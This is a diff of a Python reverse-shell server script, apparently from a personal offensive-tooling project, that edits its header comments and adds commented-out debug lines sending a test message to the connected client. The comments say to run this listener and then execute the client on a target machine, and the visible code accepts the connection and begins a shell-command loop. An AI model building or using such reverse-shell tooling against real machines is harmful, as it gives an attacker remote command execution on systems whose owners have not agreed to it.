@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 
-# Reverse Shell Written by NOCH in Python3 #
-
-# Run this listening server on your machine, then execute the client on target machine #
-# Change SERVER_HOST and SERVER_PORT accordingly #
+# Reverse shell Written by NOCH in python3 #
+# Run this server listener then execute client on target machine #
 
 import socket
 
@@ -25,6 +23,10 @@ print(listening)
 client_conn, client_addr = server.accept()
 connection = "[+] {0}:{1} Connected successfully.".format(client_addr[0], client_addr[1])
 print(connection)
+
+# Debugging purposes
+#msg = "Connection working perfectly!".encode()
+#client_conn.send(msg)
 
 # Shell Commands loop
 while True:
